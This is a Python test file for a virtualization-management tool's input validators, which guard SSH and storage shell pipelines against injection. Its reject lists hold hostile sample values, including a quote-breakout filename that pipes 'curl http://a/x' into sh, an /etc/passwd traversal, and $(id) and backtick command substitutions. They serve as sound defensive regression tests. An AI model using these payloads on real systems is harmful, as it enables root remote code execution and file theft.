# Input-validator invariants — the shell-injection / RCE guards.
#
# NS Jul 2026 (Phase 1) — these validators sit in front of the SSH / qm / pvesm /
# qemu-img / sshfs shell pipelines (V2P, content-sync, storage ops). A regression
# that loosens one of them re-opens a root-RCE-on-node class (the 2026-07-12 pentest
# CRIT was exactly a filename that slipped through into a single-quoted SSH command).
# Pure functions, no DB / no cluster — table-driven so the payload set is the spec.

from pegaprox.utils.sanitization import (
    validate_content_filename,
    validate_esxi_path_component,
    validate_storage_name,
    validate_hostname,
    validate_email,
    sanitize_username,
    sanitize_int,
    sanitize_bool,
)


# ---------------------------------------------------------------------------
# validate_content_filename — ISO / vztmpl name that flows into `test -f '<f>'`
# ---------------------------------------------------------------------------

_CONTENT_OK = [
    'debian-12.5.0-amd64.netinst.iso',
    'ubuntu_22.04-1_amd64.tar.zst',       # underscores + dots + dashes
    'CentOS-Stream-9.iso',
    'alpine-virt-3.19.qcow2',
    'x',                                   # single char, min length
]

_CONTENT_BAD = [
    "evil.iso'; curl http://a/x|sh; echo '",   # the pentest CRIT: quote breakout
    'a/b.iso',                                  # path separator → escapes the dir
    '../../etc/passwd',                         # traversal
    'my iso.iso',                               # space (shell word-split)
    '.hidden.iso',                              # leading dot (regex needs [A-Za-z0-9] first)
    '-rf.iso',                                  # leading dash (arg-injection shape)
    'a`whoami`.iso',                            # backtick command sub
    'a$(id).iso',                               # $() command sub
    'a;b.iso', 'a|b.iso', 'a&b.iso',            # command chaining
    'a\nb.iso',                                 # newline
    'iso\x00.iso',                              # NUL
    'évadé.iso',                                # non-ASCII outside the class
    'x' * 300,                                  # over the 255 bound
    '', None, 123, ['a.iso'],                   # empty / wrong type
]


def test_content_filename_accepts_real_iso_names():
    for name in _CONTENT_OK:
        assert validate_content_filename(name) is True, name


def test_content_filename_rejects_injection_and_junk():
    for name in _CONTENT_BAD:
        assert validate_content_filename(name) is False, repr(name)


# ---------------------------------------------------------------------------
# validate_esxi_path_component — datastore / VM-dir name into the V2P sshfs+qemu-img
# ---------------------------------------------------------------------------

_ESXI_OK = [
    'datastore1',
    'My VM (prod)',        # spaces + parens are legitimate in VMware names
    'ESXi-Local.1',
    'vmfs_backups+2026',
]

_ESXI_BAD = [
    'a/b',                 # slash — never a single component
    'ds; reboot',
    'ds`id`', 'ds$(id)', 'ds|cat', 'ds&sleep',
    'ds\nrm',
    'ds"quote', "ds'quote", 'ds\\back',
    ' leading-space',      # regex requires [A-Za-z0-9] first
    '', None, 42,
]


def test_esxi_path_component_accepts_real_names():
    for name in _ESXI_OK:
        assert validate_esxi_path_component(name) is True, name


def test_esxi_path_component_rejects_injection():
    for name in _ESXI_BAD:
        assert validate_esxi_path_component(name) is False, repr(name)


# ---------------------------------------------------------------------------
# validate_storage_name — PVE/XCP storage id into pvesm / qm
# ---------------------------------------------------------------------------

_STORAGE_OK = ['local-lvm', 'ceph_pool.1', 'starlvm-test', 'NFS-01']
_STORAGE_BAD = [
    '-leading-dash',       # must start alphanumeric
    'has space',
    'a;pvesm', 'a/b', 'a`x`', 'a$(x)',
    'x' * 200,             # over the 100 bound
    '', None, 7,
]


def test_storage_name_accepts_real_ids():
    for name in _STORAGE_OK:
        assert validate_storage_name(name) is True, name


def test_storage_name_rejects_injection_and_junk():
    for name in _STORAGE_BAD:
        assert validate_storage_name(name) is False, repr(name)


# ---------------------------------------------------------------------------
# validate_hostname / validate_email — format guards (not shell sinks, but used
# for connection targets + notifications)
# ---------------------------------------------------------------------------

def test_hostname_accepts_hosts_and_ips():
    for h in ['pve1', 'pve1.corp.local', '192.168.1.10', 'a-b-c.example.com']:
        assert validate_hostname(h) is True, h


def test_hostname_rejects_junk():
    for h in ['bad host', 'a;b', 'http://x', 'a/b', '', None, '-lead.com']:
        assert validate_hostname(h) is False, repr(h)


def test_email_accepts_and_rejects():
    assert validate_email('ops@pegaprox.com') is True
    assert validate_email('a.b+tag@sub.example.co.uk') is True
    for bad in ['not-an-email', 'a@b', '@x.com', 'a@.com', 'a b@x.com', '', None]:
        assert validate_email(bad) is False, repr(bad)


# ---------------------------------------------------------------------------
# sanitize_* coercers — strip / clamp rather than reject
# ---------------------------------------------------------------------------

def test_sanitize_username_strips_dangerous_chars():
    # keeps [A-Za-z0-9_-.@+], drops the rest — no shell metachars survive
    assert sanitize_username("bob'; drop") == 'bobdrop'
    assert sanitize_username('a b/c\\d') == 'abcd'
    assert sanitize_username('user@corp.com') == 'user@corp.com'  # email logins kept
    assert len(sanitize_username('x' * 200)) == 64                # length bound


def test_sanitize_int_clamps_and_defaults():
    assert sanitize_int('5', min_val=0, max_val=10) == 5
    assert sanitize_int(-3, min_val=0) == 0                       # clamp low
    assert sanitize_int(99, max_val=10) == 10                     # clamp high
    assert sanitize_int('garbage', default=7) == 7               # non-int → default
    assert sanitize_int(None, default=1) == 1


def test_sanitize_bool_coerces_strictly():
    # the strict-coercion fix: real bools, ints, and the truthy string set only
    assert sanitize_bool(True) is True
    assert sanitize_bool(False) is False
    assert sanitize_bool('true') is True
    assert sanitize_bool('1') is True
    assert sanitize_bool('on') is True
    assert sanitize_bool('yes') is True
    # the classic footgun: the STRING 'false' must NOT be truthy
    assert sanitize_bool('false') is False
    assert sanitize_bool('0') is False
    assert sanitize_bool('') is False
    assert sanitize_bool(0) is False
    assert sanitize_bool(2) is True
    assert sanitize_bool(None) is False
